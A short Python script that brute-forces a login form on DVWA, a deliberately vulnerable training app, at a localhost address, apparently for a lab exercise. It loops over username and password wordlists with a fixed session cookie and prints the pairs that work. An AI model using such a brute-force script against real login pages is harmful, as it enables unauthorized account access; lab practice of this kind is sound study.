import requests

url = "http://127.0.0.1:4280/vulnerabilities/brute/"

with open("usuarios.txt", "r", encoding="utf-8") as f:
    usuarios = [line.strip() for line in f if line.strip()]

with open("claves.txt", "r", encoding="utf-8") as f:
    claves = [line.strip() for line in f if line.strip()]


# cabecera HTTP y COokie
headers = {
    "User-Agent": "Mozilla/5.0",
    "Cookie": "PHPSESSID=d2c0d4b7b56f51ba42644c933b67dce9; security=low"
}

for usuario in usuarios:
    for clave in claves:
        payload = {"username": usuario, "password": clave, "Login": "Login"}
        response = requests.get(url, headers=headers, params=payload)

        if "Welcome to the password protected area" in response.text:
            print(f"combinación valida: {usuario} / {clave}")
        else:
            print(f"combinaciòn invalida: {usuario} / {clave}")
